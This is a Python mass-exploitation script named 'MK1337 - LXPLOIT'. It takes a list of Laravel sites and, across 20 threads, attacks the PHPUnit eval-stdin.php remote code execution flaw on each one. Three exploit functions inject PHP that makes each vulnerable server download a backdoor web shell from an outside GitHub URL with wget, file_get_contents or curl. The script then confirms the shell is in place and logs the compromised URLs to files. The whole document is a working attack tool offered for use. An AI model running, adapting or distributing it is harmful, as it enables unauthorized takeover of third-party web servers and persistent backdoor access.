import os, time, re
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
import requests as r
import requests as req
from colorama import Fore, Style
"""

MK1337 - LXPLOIT
Search Me On Hell


"""


def screen_clear():
    _ = os.system('cls')


bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}




def LxPlOiT1(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php system("wget https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php -O mk.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'Linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('LaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/mk.php', timeout=5)
            if 'MK1337_HaxOR' in CheckShell.text:
                print(f"{gr}#=======>>> Shell Was Uploaded! : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php")
                open('Shell_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php\n")
                open('Good.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php\n")
            else:
                print(f"{red}#-------> Not Uploaded : {url} <-------#")
        else:
            print(f"{red}#-------> Not Vuln :  {url} <-------#")
    except:
        pass

def LxPlOiT2(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php fwrite(fopen("mk.php","w+"),file_get_contents("https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php")); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('LaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/mk.php', timeout=5)
            if 'MK1337_HaxOR' in CheckShell.text:
                print(f"{gr}#=======>>> Shell Was Uploaded! : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php")
                open('Shell_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php\n")
                open('Good.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php\n")
            else:
                print(f"{red}#-------> Not Uploaded : {url} <-------#")
        else:
            print(f"{red}#-------> Not Vuln :  {url} <-------#")
    except:
        pass



def LxPlOiT3(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        upshell = '<?php system("curl -O https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/up.php); system("mv up.php mk.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('LaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/mk.php', timeout=5)
            if 'MK1337_HaxOR' in CheckShell.text:
                print(f"{gr}#=======>>> Shell Was Uploaded! : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php")
                open('Shell_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php\n")
                open('Good.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/mk.php\n")
            else:
                print(f"{red}#-------> Not Uploaded : {url} <-------#")
        else:
            print(f"{red}#-------> Not Vuln :  {url} <-------#")
    except:
        pass

def up(url):
    url = url.strip()
    try:
       LxPlOiT1(url)
       LxPlOiT2(url)
       LxPlOiT3(url)
    except:
       pass

def main():
    print(f'''
    {bl}
   ,--,                            ,--,                                 ,----, 
,---.'|              ,-.----.   ,---.'|       ,----..                 ,/   .`| 
|   | :,--,     ,--, \    /  \  |   | :      /   /   \     ,---,    ,`   .'  : 
:   : ||'. \   / .`| |   :    \ :   : |     /   .     : ,`--.' |  ;    ;     / 
|   ' :; \ `\ /' / ; |   |  .\ :|   ' :    .   /   ;.  \|   :  :.'___,/    ,'  
;   ; '`. \  /  / .' .   :  |: |;   ; '   .   ;   /  ` ;:   |  '|    :     |   
'   | |_\  \/  / ./  |   |   \ :'   | |__ ;   |  ; \ ; ||   :  |;    |.';  ;   
|   | :.'\  \.'  /   |   : .   /|   | :.'||   :  | ; | ''   '  ;`----'  |  |   
'   :    ;\  ;  ;    ;   | |`-' '   :    ;.   |  ' ' ' :|   |  |    '   :  ;   
|   |  .// \  \  \   |   | ;    |   |  ./ '   ;  \; /  |'   :  ;    |   |  '   
;   : ; ;  /\  \  \  :   ' |    ;   : ;    \   \  ',  / |   |  '    '   :  |   
|   ,/./__;  \  ;  \ :   : :    |   ,/      ;   :    /  '   :  |    ;   |.'    
'---' |   : / \  \  ;|   | :    '---'        \   \ .'   ;   |.'     '---'      
      ;   |/   \  ' |`---'.|                  `---`     '---'                  
      `---'     `--`   `---`                                                                                                                                                                        
 {red}MK1337  {yl}laravel Auto Upload Shell 
    {bl}https://t.me/mk1337_HxR
      ''')
    list = input(f"{gr}Your List{wh}@{red}MK1337 : {bl}~{gr}${res} ")
    url = open(list, 'r').readlines()
    try:
       ThreadPool = Pool(20)
       ThreadPool.map(up, url)
       ThreadPool.close()
       ThreadPool.join()
    except:
       pass

if __name__ == '__main__':
    screen_clear()
    main()
